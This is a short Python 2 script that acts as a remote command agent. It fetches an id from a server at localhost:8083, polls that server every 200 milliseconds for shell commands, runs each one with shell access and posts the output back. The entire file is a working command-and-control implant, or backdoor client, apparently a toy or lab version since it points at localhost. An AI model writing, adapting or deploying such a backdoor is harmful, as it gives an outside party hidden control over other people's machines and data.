import urllib2, json, time, os, subprocess, requests
_n = None
response = urllib2.urlopen('http://localhost:8083/getid')
_id = str(json.loads(response.read())["n"])
print("got id:"+str(_id))

while (True):
    time.sleep(0.2) # repeat every 200 milliseconds
    response = urllib2.urlopen('http://localhost:8083/command/'+_id)
    command = response.read()
    if command is "":
        continue
    print("Got Command: "+command)
    if command[0:2] == "cd":
        os.chdir(command[3::])
        response = os.getcwd()
    else:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        response = ''
        while True:
            out = process.stdout.read(1)
            if out == '' and process.poll() != None:
                break
            if out != '':
                response += str(out)
    r = requests.post('http://localhost:8083/response/'+_id, data={"response": response})
